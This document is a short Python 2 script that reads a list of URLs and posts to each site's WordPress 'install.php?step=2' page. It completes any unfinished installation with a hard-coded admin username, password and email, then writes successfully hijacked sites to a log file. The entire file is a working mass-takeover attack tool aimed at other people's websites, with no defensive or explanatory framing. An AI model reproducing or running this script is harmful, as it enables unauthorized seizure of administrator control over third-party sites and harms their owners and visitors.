import urllib2,requests,sys
from random import sample as rand

def rand_str (len = None) :
  if len == None :
    len = 8
  return ''.join (rand ('abcdefghijklmnopqrstuvwxyzQWERTYUIOPASDFGHJKLMNBVCXZ0987654321', len))
op = open(sys.argv[1],"r").readlines()
for url in op :
 try:
   url = url.strip()
   print "WebSite :"+url
   s = requests.Session()
   prefix = url.replace("","")
   prefix = prefix.split(".")
   if "www" in prefix:
               prefix = prefix[1]
   else :

                prefix = prefix[0]
   
   
   r1 = s.post(url+"/wp-admin/install.php?step=2", data = {'weblog_title':'27062022','user_name':'admin','admin_password':'./japext1337@@','admin_password2':'./japext1337@@','admin_email':'mantanartis21@gmail.com','language':'','Submit':'Install+WordPress'})
 
   op =urllib2.urlopen(url+"/wp-login.php")
   if "27062022" in op.read():
     print "[+] Log : "+url+" admin/./japext1337@@"
     open("logswp.txt","a").write(url+"/wp-login.php#admin@./japext1337@@\n")
   else:
    "[-] Not Installed"

 except:
    print "ERROR while connecting with the website"
    pass